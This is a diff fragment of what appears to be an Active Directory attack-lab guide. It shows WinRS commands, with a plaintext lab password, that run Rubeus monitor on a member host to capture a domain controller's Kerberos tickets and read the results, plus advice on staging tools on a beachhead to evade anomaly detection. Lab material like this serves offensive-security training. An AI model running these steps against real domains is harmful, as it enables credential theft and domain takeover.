-**Step 2 — Start Rubeus monitor on mbr01 to capture incoming DC auth:**
-
-```powershell
+# Start Rubeus monitor on mbr01 via WinRS
 winrs -r:mbr01.child.cadre.local -u:child\analyst_t1 -p:T13r_An@lyst! "C:\Tools\cadre-attack\Rubeus.exe monitor /targetuser:DC02$ /interval:5 /filtername:DC02$ /output:C:\Tools\cadre-attack\dc02_tgs.txt"
 ```
 
@@ -2135,10 +2224,7 @@ winrs -r:mbr01.child.cadre.local -u:child\analyst_t1 -p:T13r_An@lyst! "C:\Tools\
 winrs -r:mbr01.child.cadre.local -u:child\analyst_t1 -p:T13r_An@lyst! "Get-Content C:\Tools\cadre-attack\dc02_tgs.txt"
 ```
 
-**Why this is more realistic:**
-- Real attackers don't keep every tool on their C2 server; they stage on intermediate hosts.
-- Running coercion from mbr01 means the source IP of the coercing traffic is a **legitimate domain member**, making anomaly detection harder.
-- The listener and the trigger are on the same host, reducing cross-host timing artifacts.
+**Why this matters:** Real attackers don't keep every tool on their C2 server; they stage on intermediate hosts. Running coercion from `mbr01` means the source IP is a legitimate domain member, the listener and trigger are co-located, and the operator must manage tool staging on a beachhead rather than from a clean attacker box.
 
 **Fallback from Kali (single-hop):** If WinRS lateral movement is blocked, the same coercion can be run directly from Kali for lab-learning purposes:
 
